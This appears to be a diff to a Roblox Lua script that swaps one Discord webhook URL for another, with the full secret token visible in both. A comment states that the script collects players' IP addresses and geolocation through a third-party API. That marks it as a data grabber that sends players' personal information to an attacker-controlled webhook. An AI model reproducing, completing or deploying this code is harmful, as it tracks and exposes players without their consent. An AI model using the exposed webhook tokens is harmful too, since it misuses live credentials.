@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
-local url = "https://discord.com/api/webhooks/1456304374694412400/f5v3zsWGD-rWA5gS3c0epqk_XnXjWzDur7eqcHgD8Vn59dbYCXL-eXghWpFb964wJGY_"
+local url = "https://discord.com/api/webhooks/1462345252638691396/vZRblG20YzbmVTTTJxPqL7fErU4_3UigoVcQ1w9DHVOo6O9LLseOE83pupX6cZ3kJGwf"
 
 -- 獲取玩家 IP 與 地理位置 (透過第三方 API)
 local GetIP = "未知"
